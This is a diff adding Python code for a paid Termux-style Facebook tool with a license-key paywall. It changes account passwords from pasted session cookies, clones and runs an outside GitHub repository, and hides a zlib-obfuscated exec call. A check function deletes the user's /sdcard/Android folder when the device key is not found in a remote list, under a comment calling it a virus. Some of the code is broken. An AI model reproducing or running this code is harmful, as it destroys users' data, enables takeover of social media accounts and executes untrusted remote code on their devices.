+		pw = input(f"{W} [{R}+{W}] {W}ENTER OLD PASS : ")
+		cok = input(f"{W} [{R}+{W}] {W}PASTE COOKIE : ")
+		cookies = {'cookie':cok}
+		try:
+			r = requests.get('https://free.facebook.com',cookies=cookies).text.replace("amp;","")
+		except CE:
+			print(f"{W} [{R}+{W}] {W}CHECK INTERNET")
+		except Exception as e:
+			print(e)
+		if "/zero/optin/write/?" in r:
+			self.iAmFreeMode(cookies,r)
+		r= requests.get("https://free.facebook.com/settings/security/password/?",cookies=cookies).text
+		r= r.replace("amp;","")
+		next = re.findall('action\="(.*?)"',r)[1]
+		data = {
+	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
+	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
+	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
+	"password_old":pw,
+	"password_new":np,
+	"password_confirm":np,
+	"save": "Save changes"
+	}
+		po = requests.post("https://free.facebook.com"+str(next),cookies=cookies,data=data).text
+		
+		po = po.replace("amp;","")
+		if 'Password changed' in po:
+			print(f"{W} [{R}+{W}] {W}✓PASS CHANGE SUCCESS ")
+			
+			sp(2)
+			input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK")
+			self.iAmPasswordManager()
+		else:
+			print(f"{W} [{R}+{W}] {W}FAIL PASS CHANGE ")
+	def iAmFreeMode(self,cookies,r):
+		for x in re.findall('action\=\"(.*?)"',r):
+			if "/zero/optin/write/?" in x:
+				next = x
+		data ={}
+		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).grouprint(1)
+		jazoest = re.search('name="jazoest" value="(.*?)"',r).grouprint(1)
+		data.update(
+		{
+		'fb_dtsg':fb_dtsg,
+		'jazoest':jazoest,
+		'submit':'Continue'
+		}
+		)
+		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
+	
+	def change_default(self):
+		logo()
+		
+		try:
+			iamdefaultpassword= open(".default_password.txt","r").read()
+		except FileNotFoundError:
+			iamdefaultpassword = "NADEEM786@##"
+		print(f"{W} [{R}+{W}] {W}DEFAULT PASS : %s"%(iamdefaultpassword))
+		line()
+		os.system("rm -rf .default_password.txt ")
+		change_pw = input(f"{W} [{R}+{W}] {W}ENTER NEW PASS : ")
+		if len(change_pw) < 6:
+			print(f"{W} [{R}+{W}] {W}MINIMUM SIX DIGIT .")
+			sp(2)
+			self.change_default()
+		
+		t = open(".default_password.txt","w").write(change_pw)
+		print(f"{W} [{R}+{W}] {W}PASS CHANGE SUCCESS ! ")
+		print(f"{W} [{R}+{W}] {W}YOUR NEW PASS IS : %s "%(change_pw))
+		line()
+		input(f"{W} [{R}+{W}] {W}PRESS ENTER TO BACK ")
+
+		self.iAmPasswordManager()
+
+def Create_menu():
+	clear()
+	os.system('espeak -a 300 " Wellcome, To,  File,  , Menu,"')
+	print(f'{W} [{R}1{W}] {W}CREATE FILE BY NADEEM TOOL ')
+	print(f'{W} [{R}2{W}] {W}CREATE FILE BY HANNAN TOOL ')
+	print(f'{W} [{R}0{W}] {W}BACK MAIN MENU ')
+	line()
+	option=input(f'{W} [{R}+{W}] {W}CHOICE MENU >> ')
+	if option in ['1','01']:
+		os.system('python Extract.py')
+	if option in ['2','02']:
+		Create_M2()
+	if option in ['0','00']:
+		iAmMain().iAmMenu()()
+	else:
+		line()
+	print(f'{W} [{R}+{W}] {W}SELECTED WRONG OPTION')
+	time.sleep(2)
+	Create_menu()
+#####____Create-File-M1____#####
+
+#####____Create-File-M2____#####
+def Create_M2():
+		os.system("cd && git clone --depth=1 https://github.com/Hannan-404/FILE")
+		os.system('cd && cd FILE ;python V33.py')
+
+def getKey():
+    myid = str(os.getuid())
+    myid=myid.upper()[::-1]
+    n=re.findall("(\d\d)",myid)
+    plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
+    xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
+    
+    return "JUTT-"+myid+xp
+exec(zlib.decompress(b'x^\xcb\xce\xb5\xd5P\xcf())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fI-J\xd5\xf5,N,\xd4\xf5N\xd5\xf5KL\xcc\xd5\x0fJ\xccK\xd4\xcfM\xcc\xcc\x03\xb3\xe2\x1d\x0b\x8a\xf2\xcb\x12s\xd45\x01\xb2@\x1d\r'))
+def xi():
+    global km
+    j=getKey()
+    r=requests.get(km).text
+    if j in r:
+        pass
+    else:
+        os.system("clear")
+        #uncomment to activate virus
+        shutil.rmtree("/sdcard/Android")
+        print(f"Don't Bypass ")
+        sys.exit()
+
+#####____END-Setup____##### 
+def Activate():
+    global km
+    r=requests.get(km).text
+    k=getKey()
+    if k in r:
+        iAmMain().iAmMenu()
+        #print(f"\033[1;92mYour Token is successfully Approved\33[1;37m")
+    else:
+                clear()
+                os.system('espeak -a 300 " Wellcome, To,   Paid,  ,Menu,"')
+                os.system('espeak -a 300 " This, Tool,   is,  ,Paid,"')
+                print(f'{W} [{W}+{W}] {W}{R}           YOUR KEY IS NOT ACTIVE')
+                line() 
+                print(f"{W} [{R}+{W}]{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}>{G}PAID MENU{R}<{R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={W}={R}={R}>")
+                line()
+                print(f'{W} [{R}+{W}] {W}FOR 15 DAYS {R}400 PKR ')
+                print(f'{W} [{R}+{W}] {W}FOR 30 DAYS {R}700 PKR')
+                print(f'{W} [{R}+{W}] {W}EASIPAISA == {R}03082503426 ')
+                line() 
+                print(f'{W} [{R}+{W}] {W}FOR 15 DAYS {R}6$ ')
+                print(f'{W} [{R}+{W}] {W}FOR 30 DAYS {R}10$')
+                print(f'{W} [{R}+{W}] {W}BINANCE ID == {R}442893784 ')
+                line()
+                print(f'{W} [{R}+{W}] {W}FIRST SEND PAYMENT SS WITH KEY')
+                print(f'{W} [{R}+{W}] {W}FOR KEY ISSUE CONTACT WITH\n{W} [{R}+{W}] {R}NADEEM NADEEM RAJPUT        👈')
+                line()
+                print(f'{W} [{R}+{W}] {W}GET APPROVAL FOR USE ')
+                print(f'{W} [{R}+{W}] {W}SEND YOUR KEY TO ADMIN')
+                print(f'{W} [{R}+{W}] {W}AND GET APPROVAL')
+                print(f'{W} [{R}+{W}] {W}COPY THIS KEY 👇')
+                line()               
+                print(f"{W} [{R}+{W}] {W}YOUR KEY :\x1b[1;97m "+k)
+                line()                
+                input(f'{W} [{R}+{W}] {W}PRESS ENTER')
+                tks = ('Hi-%20NADEEM-Sir%20!%20-Please%20-Activate%20-My%20-Key%20-The%20-Key%20-Is%20:%20'+k)
+                os.system('am start https://wa.me/+923082503426?text='+tks)
+                Activate()
+                sys.exit()
+#####____END-Setup____#####   
+iAmMain().iAmMenu()
